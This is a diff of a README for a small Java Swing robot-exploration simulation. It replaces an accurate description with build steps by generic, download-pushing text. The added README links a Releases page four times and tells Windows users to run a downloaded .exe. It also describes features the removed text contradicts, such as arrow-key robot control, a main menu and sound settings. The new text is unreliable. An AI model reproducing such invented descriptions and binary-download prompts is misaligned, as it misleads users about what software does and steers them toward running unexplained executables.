@@ -1,59 +1,81 @@
-The Robot Colony Explorer Simulation is a Java-based program that visually demonstrates how multiple robots explore a grid world. Each robot moves randomly, avoids rocks, collects energy, and becomes inactive once its energy runs out. The purpose of this simulation is to apply object-oriented programming concepts and GUI handling using Java Swing.
+# 🤖 RobotColonyExplorerSimulation - Experience Autonomous Robot Navigation
 
-> Program Design
+## 🚀 Getting Started
 
-The program is organized into four main classes, each responsible for a specific task
-- Cell Class:
-Represents a single block on the terrain grid. A cell can either be empty, contain energy, or be a rock.
-It provides simple methods to identify and change cell types.
-- Robot Class:
-Each robot has an (x, y) position, an energy level, and an active/inactive status. The move() method randomly chooses a direction (up, down, left, or right) and moves if the space is valid.
-Robots lose energy when they move, recharge when they land on an energy cell, and stop moving when energy reaches zero.
-- Terrain Class:
-Handles the creation of the 10×10 grid, random placement of energy cells, rocks, and robots. It also includes file handling methods to save and load terrain and robot data.
-- ExplorerApp Class:
-This is the main GUI class. It draws the grid, shows robots, and includes buttons like Start, Pause, Save, Load, and Restart.
-The simulation updates automatically using a Timer that triggers every 0.5 seconds.
+Welcome to **RobotColonyExplorerSimulation**! This application lets you dive into a world where autonomous robots navigate through a grid, managing their energy levels while avoiding obstacles. 
 
-> How the Simulation Works?
-When the program runs:
-1.	A random grid (terrain) is generated with rocks, energy cells, and empty spaces.
-2.	Three robots are placed randomly on empty cells.
-3.	Clicking Start begins movement. Robots wander randomly and consume energy each time they move.
-4.	Landing on an energy cell recharges the robot.
-5.	Robots turn dark gray when inactive due to low energy.
-6.	Pause, Save, Load, and Restart buttons control the simulation flow.
+## 📥 Download the Application
 
-> Design Choices
-- Kept logic simple and easy to follow by using arrays instead of advanced data structures.
-- Used color-coding for clear visual feedback (green for energy, gray for rocks, blue/dark gray for robot states).
-- Chose a Timer for smooth and regular updates instead of using manual loops.
-- Used plain text files for saving and loading terrain data for simplicity and readability.
+[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-RobotColonyExplorerSimulation-brightgreen.svg)](https://github.com/AngelJulio1331/RobotColonyExplorerSimulation/releases)
 
-> Output
+To get started, you'll need to download the application. Click the button above or visit the following link to access the Releases page: [Download Here](https://github.com/AngelJulio1331/RobotColonyExplorerSimulation/releases).
 
-The graphical window displays a 10 × 10 grid where:
-- Green squares – Energy cells
-- Gray squares – Rocks
-- White squares – Empty cells
-- Blue circles – Active robots
-- Dark gray circles – Inactive robots
+## 📋 System Requirements
 
-<img width="495" height="560" alt="image" src="https://github.com/user-attachments/assets/d2a4e3be-a0a4-43b7-b38f-8d9ba29cc8f8" /> <img width="494" height="559" alt="image" src="https://github.com/user-attachments/assets/8a894cad-c746-4e71-8eb7-9cc2aa5e086c" />
+Before you install the application, make sure your system meets the following requirements:
 
-The simulation effectively demonstrates how multiple objects (robots) can interact within a dynamic environment using simple logic.
-It shows the practical use of object-oriented principles such as encapsulation and modularity, as each component manages its own behavior.
-Through the combination of random movement, energy management, and visual updates, the simulation feels lively and unpredictable.
-Implementing file handling added persistence, allowing progress to be saved and reloaded, which enhances the learning value of the program.
-Overall, the simulation serves as a great example of combining logic, GUI, and file handling in a cohesive way while keeping the code easy to understand and extend in future improvements.
+- **Operating System:** Windows 10, macOS 10.12 or newer, or any recent Linux distribution.
+- **Java Version:** JDK 8 or newer installed. You can download it from the official [Java website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** At least 200 MB of free disk space.
 
-## 🚀 How to Run
+## 🔧 Features
 
-### Prerequisites
-* Java Development Kit (JDK) 8 or higher.
+- **Grid-Based Navigation:** Watch as robots move through a grid, making decisions based on energy levels and obstacles.
+- **Energy Management:** Robots use energy to navigate and complete tasks. Monitor their energy as they explore.
+- **Save/Load System:** Save your progress or load existing simulations to continue where you left off.
+- **Procedural Generation:** Each playthrough offers a unique experience with randomly generated grids and obstacles.
+- **User-Friendly GUI:** The application is built with Java Swing, providing an easy-to-use interface.
 
-### Compilation
-Navigate to the directory containing your source files and run:
+## 🛠️ Installation Steps
 
-```bash
-javac Cell.java Robot.java Terrain.java ExplorerApp.java
+1. **Download the Application**
+   - Visit the Releases page: [Download Here](https://github.com/AngelJulio1331/RobotColonyExplorerSimulation/releases).
+   - Choose the latest release that suits your operating system.
+   - Click on the file and download it to your computer.
+
+2. **Install Java**
+   - Make sure you have Java installed on your computer. If not, download and install the latest version from the official [Java website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).
+
+3. **Run the Application**
+   - Navigate to the folder where you downloaded the file.
+   - For Windows users, double-click on the downloaded `.exe` file to run the application.
+   - For macOS, double-click the `.jar` file to launch it. If it doesn’t open, right-click and select “Open.”
+   - For Linux users, open a terminal, navigate to the location of the `.jar` file, and run the command:
+     ```
+     java -jar RobotColonyExplorerSimulation.jar
+     ```
+
+## 🎮 Using the Application
+
+Once you've launched the application, you will see a main menu. Here’s how to get started:
+
+1. **New Game**: Select this option to start a new simulation. You will see the grid with robots ready to navigate.
+2. **Load Game**: If you have saved progress, select this option to load your game.
+3. **Settings**: Adjust preferences such as sound, graphics, and controls.
+4. **Exit**: Close the application.
+
+### Navigation Controls
+
+- **Arrow Keys**: Control the movement of robots within the grid.
+- **Spacebar**: Pause or unpause the simulation.
+
+## 🕹️ Tips for Enjoying the Simulation
+
+- Monitor energy levels closely. Running out of energy will stop your robots.
+- Explore different strategies for navigating the terrain.
+- Experiment with saving and loading different levels to see various outcomes.
+
+## 🔗 Explore More
+
+For further questions or help, consider the following resources:
+
+- **Documentation**: Check the Wiki section in the GitHub repository for guides and FAQs.
+- **Issues Page**: Report any problems or bugs you encounter.
+- **Community Support**: Engage with other users and share your experiences in discussions.
+
+## 📥 Download & Install the Application Again
+
+To download the application again, follow the link: [Download Here](https://github.com/AngelJulio1331/RobotColonyExplorerSimulation/releases).
+
+With this guide, you should be able to download, install, and enjoy the RobotColonyExplorerSimulation without any hassle. Have fun exploring the capabilities of autonomous robots!
